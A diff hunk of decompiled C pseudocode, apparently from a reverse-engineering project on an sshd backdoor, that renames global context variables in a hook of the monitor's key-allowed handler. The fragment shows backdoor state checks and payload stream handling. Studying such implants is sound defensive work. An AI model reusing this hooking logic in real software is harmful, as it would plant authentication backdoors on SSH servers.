@@ -46,33 +46,33 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   sshd_payload_ctx_t *payload_record;
   u8 zero_seed;
   sshbuf payload_buf;
-  global_context_t *global_ctx;
+  global_context_t *global_ctx_ptr;
   size_t payload_chunk_size;
   u8 payload_seed_buf[57];
   sshd_payload_ctx_t *payload_ctx;
   sshd_monitor_func_t orig_handler;
   u8 payload_header_buf[122];
   
-  ctx = ::global_ctx;
+  ctx = global_ctx;
   zero_seed = 0;
-  if (::global_ctx == (global_context_t *)0x0) {
+  if (global_ctx == (global_context_t *)0x0) {
     return 0;
   }
-  libc_imports_ref = ::global_ctx->libc_imports;
+  libc_imports_ref = global_ctx->libc_imports;
   if (libc_imports_ref == (libc_imports_t *)0x0) {
     return 0;
   }
-  sshd_ctx = ::global_ctx->sshd_ctx;
+  sshd_ctx = global_ctx->sshd_ctx;
   if (sshd_ctx == (sshd_ctx_t *)0x0) {
     return 0;
   }
-  if (::global_ctx->payload_buffer == (u8 *)0x0) {
+  if (global_ctx->payload_buffer == (u8 *)0x0) {
     return 0;
   }
   orig_mm_answer_keyallowed = sshd_ctx->mm_answer_keyallowed_start;
   if (orig_mm_answer_keyallowed == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
-  if (::global_ctx->payload_state == PAYLOAD_STREAM_DISPATCHED) goto LAB_0010944f;
-  state_ok = check_backdoor_state(::global_ctx);
+  if (global_ctx->payload_state == PAYLOAD_STREAM_DISPATCHED) goto LAB_0010944f;
+  state_ok = check_backdoor_state(global_ctx);
   if (((state_ok == FALSE) || (ctx->payload_state == PAYLOAD_STREAM_DISPATCHED)) ||
      (ctx->payload_state == PAYLOAD_STREAM_POISONED)) goto LAB_00109429;
   clear_cursor = &payload_ctx;
